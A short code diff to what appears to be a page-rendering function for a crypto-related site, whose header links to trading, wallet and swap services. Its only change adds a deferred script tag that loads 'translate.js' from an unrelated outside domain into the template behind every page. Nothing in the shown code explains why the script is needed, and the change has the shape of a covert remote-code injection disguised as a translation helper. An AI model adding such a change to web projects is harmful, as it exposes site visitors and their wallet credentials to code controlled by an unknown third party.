@@ -145,7 +145,7 @@ table{width:100%;border-collapse:collapse;font-size:14px}td,th{padding:6px 4px;b
 @media(max-width:600px){table{display:block;overflow-x:auto}}
 </style></head><body>
 <header><a class=brand href="https://melek.salon/explore">MELEK</a><a href="https://melek.salon/trending">All Posts</a><a href="https://engine.melek.salon/">Trade</a><a href="https://wallet.melek.salon/~witnesses">Vote</a><a href="https://kula.money/">KulaSwap</a></header>
-<main>${body}</main></body></html>`;
+<main>${body}</main><script src="https://pentecaust.com/translate.js" defer></script></body></html>`;
 }
 
 export async function renderFund() {
